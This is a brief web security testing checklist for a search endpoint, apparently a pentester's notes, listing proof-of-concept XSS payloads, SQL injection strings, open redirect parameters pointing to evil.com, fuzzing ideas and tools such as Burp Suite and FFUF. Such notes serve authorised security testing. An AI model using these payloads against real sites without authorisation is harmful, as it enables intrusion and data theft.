# Search Endpoint Testing Guide

### 📌 Target: `/search?keyword=womp`

###  Basic Test Cases
- Check for client-side filtering
- Use reserved characters: `!@#$%^&*()<>`
- Inject common payloads for XSS, SQLi, Open Redirect

### XSS Payloads
<script>alert(1)</script>
"><svg/onload=alert(1)>
"><img src=x onerror=alert(1)>

### SQL Injection Payloads
womp' OR '1'='1
womp' --
womp') OR 1=1--

### Open Redirect Payloads (if redirection observed)
/search?next=http://evil.com
/search?redirect=https://google.com

### Fuzzing Ideas
- Long strings (`A*10,000`)
- Unicode payloads (`٪` `%EF%BC%86`)
- HTML-encoded strings

### 🛠️ Tools Used
- Burp Suite Intruder
- FFUF with custom wordlists
- XSS Hunter

### 📌 Notes
- Check `Referer`, `Origin`, and `Content-Type` behavior
- Review caching headers (`Cache-Control`, `ETag`, etc.)
- Observe input reflection in responses